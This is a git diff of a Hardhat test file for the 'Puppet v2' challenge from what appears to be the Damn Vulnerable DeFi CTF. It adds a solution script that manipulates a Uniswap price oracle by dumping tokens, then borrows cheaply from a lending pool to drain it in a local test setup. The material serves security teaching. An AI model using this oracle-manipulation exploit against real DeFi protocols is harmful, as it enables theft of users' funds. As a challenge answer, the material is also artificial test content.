@@ -5,6 +5,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { BigNumber } = require("ethers");
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, player;
@@ -20,7 +21,7 @@ describe('[Challenge] Puppet v2', function () {
     const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
 
         await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
@@ -29,7 +30,7 @@ describe('[Challenge] Puppet v2', function () {
         const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
         const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
         const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
-    
+
         // Deploy tokens to be traded
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
         weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();
@@ -39,7 +40,7 @@ describe('[Challenge] Puppet v2', function () {
         uniswapRouter = await UniswapRouterFactory.deploy(
             uniswapFactory.address,
             weth.address
-        );        
+        );
 
         // Create Uniswap pair against WETH and add liquidity
         await token.approve(
@@ -59,7 +60,7 @@ describe('[Challenge] Puppet v2', function () {
             await uniswapFactory.getPair(token.address, weth.address)
         );
         expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);
-            
+
         // Deploy the lending pool
         lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
             weth.address,
@@ -83,11 +84,73 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        async function log() {
+            console.log({
+                price: (await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)) / BigNumber.from(10n ** 18n),
+                total: (await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)) / BigNumber.from(10n ** 18n),
+            })
+        }
+
+        const lastBlock = await ethers.provider.getBlock('latest');
+        const deadline = lastBlock.timestamp * 2;
+
+        await log();
+        await weth.connect(player).deposit({ value: 19n * 10n ** 18n });
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            1,
+            [token.address, weth.address],
+            player.address,
+            deadline,
+        );
+
+        await log();
+
+        const borrowAmount = 10000n * 10n ** 18n
+        const collateral = await lendingPool.calculateDepositOfWETHRequired(borrowAmount)
+
+        await weth.connect(player).deposit({ value: collateral });
+        await weth.connect(player).approve(lendingPool.address, collateral);
+        await lendingPool.connect(player).borrow(borrowAmount);
+        await token.connect(player).approve(uniswapRouter.address, borrowAmount);
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            borrowAmount,
+            1,
+            [token.address, weth.address],
+            player.address,
+            deadline,
+        );
+
+        await log();
+
+        await weth.connect(player).approve(lendingPool.address, 10n * 10n ** 18n);
+        await lendingPool.connect(player).borrow(990000000000000000000000n);
+
+        await log();
+        console.log({
+            x: await uniswapExchange.balanceOf(player.address) / BigNumber.from(1n * 10n ** 18n),
+            y: await weth.balanceOf(player.address) / BigNumber.from(1n * 10n ** 18n),
+            z: await token.balanceOf(lendingPool.address) / BigNumber.from(1n * 10n ** 18n),
+            k: (await uniswapRouter.connect(player).getAmountsIn(1n * 10n ** 18n, [weth.address, token.address]))[0],
+        })
+
+        await weth.connect(player).approve(uniswapRouter.address, 1000n * 10n ** 18n);
+        await weth.connect(player).withdraw(1n * 10n ** 18n);
+
+        await uniswapRouter.connect(player).swapETHForExactTokens(
+            10000n * 10n ** 18n,
+            [weth.address, token.address],
+            player.address,
+            deadline,
+            { gasLimit: 1e6, value: 1n * 10n ** 18n }
+        );
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-        // Player has taken all tokens from the pool        
+        // Player has taken all tokens from the pool
         expect(
             await token.balanceOf(lendingPool.address)
         ).to.be.eq(0);
